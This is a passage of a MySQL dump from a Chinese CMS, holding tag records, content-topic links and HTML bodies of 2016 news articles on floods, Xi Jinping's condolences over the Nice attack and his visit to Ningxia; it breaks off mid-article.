INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (515,'运营商',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (516,'融资',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (517,'受',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (518,'波及',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (519,'李克强',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (520,'联合国',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (521,'承诺',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (522,'援助',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (523,'难民',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (524,'这是',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (525,'责任',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (526,'道义',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (527,'担当',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (528,'研制',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (529,'隐身',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (530,'潜水',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (531,'服',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (532,'跟',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (533,'鲨鱼',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (534,'同游',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (535,'也',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (536,'不怕',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (537,'发现',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (538,'石渠',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (539,'至少',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (540,'30万公顷',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (541,'珍贵',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (542,'泥炭',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (543,'湿地',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (544,'资源',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (545,'全世界',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (546,'最',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (547,'孤独',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (548,'咖啡馆',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (549,'海拔',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (550,'4860米',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (551,'达',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (552,'古',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (553,'冰川',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (554,'巅',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (555,'中俄',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (556,'合作',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (557,'联合',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (558,'反恐',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (559,'训练',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (560,'圆满结束',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (561,'探访',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (562,'燕',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (563,'城',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (564,'监狱',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (565,'蔬菜',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (566,'自己',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (567,'种',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (568,'午餐',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (569,'两',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (570,'菜',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (571,'汤',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (572,'摄影师',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (573,'巨',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (574,'鳄',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (575,'水',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (576,'而出',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (577,'吞食',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (578,'猎物',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (579,'上演',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (580,'一箭双雕',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (581,'宛如',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (582,'置身',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (583,'黑客帝国',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (584,'啤酒',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (585,'丛林',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (586,'惊艳',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (587,'青岛',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (588,'海滨',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (589,'夜空',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (590,'半',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (591,'爱与恨',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (592,'追',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (593,'逃',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (594,'人',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (595,'再一次',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (596,'掀起',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (597,'一段',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (598,'惊人',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (599,'传奇',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (600,'那年',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (601,'青春',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (602,'我们',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (603,'正好',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (604,'刘',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (605,'丹',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (606,'妮',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (607,'演绎',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (608,'闺',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (609,'蜜',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (610,'奔',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (611,'跑吧',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (612,'兄弟',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (613,'收',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (614,'官',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (615,'对决',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (616,'一触即发',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (617,'邓',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (618,'超',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (619,'岳',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (620,'云',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (621,'鹏',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (622,'压垮',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (623,'惨叫',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (624,'出席',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (625,'总理',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (626,'家宴',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (627,'小小',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (628,'特',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (629,'鲁',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (630,'多',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (631,'表演',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (632,'后空翻',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (633,'习',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (634,'主席',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (635,'中央军委',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (636,'领导',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (637,'推进',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (638,'军队',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (639,'战斗力',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (640,'建设',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (641,'纪实',2);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (642,'西北',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (643,'第一村',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (644,'白',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (645,'哈',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (646,'巴',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (647,'早秋',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (648,'美国',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (649,'金秋',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (650,'不止',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (651,'红叶',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (652,'德国',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (653,'举行',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (654,'称重',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (655,'比赛',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (656,'763公斤',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (657,'获得',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (658,'加冕',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (659,'战',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (660,'队员',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (661,'魔鬼',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (662,'周',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (663,'挑战',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (664,'50项',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (665,'严苛',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (666,'极限',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (667,'项目',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (668,'党中央',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (669,'民族',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (670,'工作',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (671,'创新',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (672,'发展',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (673,'楼市',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (674,'调控',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (675,'应',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (676,'跳出',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (677,'周期性',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (678,'怪圈',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (679,'黄金',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (680,'接连',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (681,'下跌',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (682,'难道',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (683,'大妈',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (684,'来',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (685,'托盘',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (711,'乌兰',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (712,'布',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (713,'统',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (714,'牧歌',1);
INSERT INTO `jc_content_tag` (`tag_id`,`tag_name`,`ref_counter`) VALUES (715,'秋韵',1);

#
# Source for table jc_content_topic
#

CREATE TABLE `jc_content_topic` (
  `content_id` int(11) NOT NULL,
  `topic_id` int(11) NOT NULL,
  PRIMARY KEY (`content_id`,`topic_id`),
  KEY `fk_jc_content_topic` (`topic_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS专题内容关联表';

#
# Dumping data for table jc_content_topic
#

INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (2,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (2,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (2,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (7,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (7,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (7,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (11,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (11,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (11,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (12,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (12,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (12,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (13,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (13,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (13,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (14,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (14,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (14,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (27,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (27,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (27,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (28,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (28,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (28,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (32,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (32,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (32,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (112,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (112,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (112,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (113,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (113,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (113,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (114,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (114,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (114,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (115,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (115,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (115,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (116,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (116,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (116,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (117,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (117,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (117,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (118,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (118,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (118,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (119,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (119,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (119,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (120,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (120,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (120,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (130,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (131,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (131,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (131,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (132,1);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (132,2);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (132,3);
INSERT INTO `jc_content_topic` (`content_id`,`topic_id`) VALUES (141,1);

#
# Source for table jc_content_txt
#

CREATE TABLE `jc_content_txt` (
  `content_id` int(11) NOT NULL,
  `txt` longtext COMMENT '文章内容',
  `txt1` longtext COMMENT '扩展内容1',
  `txt2` longtext COMMENT '扩展内容2',
  `txt3` longtext COMMENT '扩展内容3',
  PRIMARY KEY (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容文本表';

#
# Dumping data for table jc_content_txt
#

INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (11,'<p style=\"text-indent: 2em;\">记者从国家防总、水利部14日召开的新闻发布会上获悉：据初步统计，截至7月13日，长江中下游湖北、湖南、江西、安徽、江苏等5省堤防巡查防守和抢险共投入62.2万人(含部队3.08万人)，6月30日以来已累计投入抗洪抢险777万人次。</p><p><br/></p><p style=\"text-indent: 2em;\">截至7月13日，今年以来全国已有28省(区、市)1508县遭受洪灾，农作物受灾面积5460.66千公顷，受灾人口6074.67万人，因灾死亡237人、失踪93人，倒塌房屋14.72万间，直接经济损失约1469.80亿元。与2000年以来同期均值相比，今年受灾人口、死亡人口、倒塌房屋分别偏少6%、49%、55%，受灾面积、直接经济损失分别偏多26%、213%。</p><p><br/></p><p style=\"text-indent: 2em;\">此外，中央气象台14日继续发布暴雨蓝色预警，未来3天，强降雨将自西向东影响四川盆地、江汉、江淮、江南北部及黄淮南部，上述地区将有大到暴雨，部分地区有大暴雨，局部伴有短时雷雨大风等强对流天气。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (12,'<p style=\"text-indent: 2em;\">央视新闻：【习近平就#法国尼斯袭击事件#向法国总统致慰问电】习近平对这一骇人听闻的野蛮行径表示强烈谴责，向不幸遇难者表示深切的哀悼，向伤者和遇难者家属表示诚挚的慰问。习近平指出，中方坚决反对一切形式的恐怖主义，愿同法方深化反恐合作，共同维护中法两国和世界安全和平。</p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (14,'<p style=\"text-indent: 2em;\">【习近平考察宁夏首站到固原，冒雨向红军长征会师纪念碑敬献花篮】7月18日，习近平总书记到宁夏回族自治区考察。从北京直飞固原，驱车70多公里到将台堡，向红军长征会师纪念碑敬献花篮并参观三军会师纪念馆。1936年10月，红军三大主力在会宁和将台堡会师，标志二万五千里长征胜利结束。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142227i3ee.jpg\" title=\"16464387039280572236.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/1914230968h5.jpg\" title=\"9093755211529617012.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：缅怀先烈、不忘初心，走好新的长征路】参观三军会师纪念馆时，习近平说，红军长征创造了中外历史的奇迹。革命理想高于天，不怕牺牲、排除万难去争取胜利，面对形形色色的敌人决一死战、克敌制胜，这些都是长征精神的内涵。我们要继承和弘扬好伟大的长征精神。有了这样的精神，没有什么克服不了的困难。我们完全有信心有决心有恒心实现中华民族伟大复兴的中国梦。</p><p><br/></p><p style=\"text-indent: 2em;\">习近平说，长征永远在路上。这次专程来这里，就是缅怀先烈、不忘初心，走新的长征路。今天是实现“两个一百年”奋斗目标的新长征。我们这一代人要走好我们这一代人的长征路。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142342h33w.jpg\" title=\"13099311371353179840.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：革命传统教育基地不要贪大求洋】习近平说，革命传统和爱国主义教育基地建设一定不要追求高大全，搞得很洋气、很现代化，花很多钱，那就不是革命传统了，革命传统就变味了。可以通过传统教育带动旅游业，但不能失去红色旅游的底色。只有体会到革命年代的艰苦，才能使人们真正受到教育。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142414bvfg.jpg\" title=\"7973019827669232390.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：我是来看扶贫落实情况的】18日下午，习近平总书记来到泾源县大湾乡杨岭村看望父老乡亲，实地考察精准扶贫情况。总书记察看村容村貌，向当地干部了解村子脱贫情况。走进回族群众马科的家，习近平察看屋内陈设，掀开褥子看炕垒得好不好，问屋顶上铺没铺油毡、会不会漏雨，电视能看多少台。来到厨房，打开灶上的大锅盖，看里面做着什么好吃的。厨房一角有个淋浴的地方，听说安了太阳能热水器，习近平说“挺好”，关心地问家里的小男孩：“你常洗澡吗？”</p><p><br/></p><p style=\"text-indent: 2em;\">墙上张贴着的“建档立卡贫困户精准脱贫信息卡”引起总书记注意。“6口人、劳动力2人，养牛6头，种玉米15亩，牛出栏2头收入7000，劳务输出收入21500，综合收入47000……”习近平逐项察看，一笔一笔算着马科家的收入账。习近平说，信息登记挺细致，关键要抓好落实，我就是来看落实情况的。马科说，我一定努力让今年计划落到口袋里，实现脱贫摘帽的目标。习近平希望马科把孩子教育搞好，学知识、有文化，决不能让他们输在起跑线上。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142446ch8y.jpg\" title=\"2231079109511926610.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p style=\"text-indent: 